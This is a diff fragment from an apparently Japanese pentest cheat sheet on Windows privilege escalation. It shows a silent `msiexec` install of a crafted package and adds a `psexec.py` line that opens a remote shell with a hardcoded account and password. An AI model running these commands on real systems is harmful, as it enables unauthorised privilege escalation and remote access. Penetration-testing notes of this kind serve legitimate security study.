@@ -1144,7 +1144,9 @@ msiを実行します。
 
 ```cmd
 msiexec /quiet /qn /i C:\hodor.msi
+psexec.py "<domain>/hodor:Qwerty123!"@<IP>
 ```
+
 
 #### スケジュールタスク
 
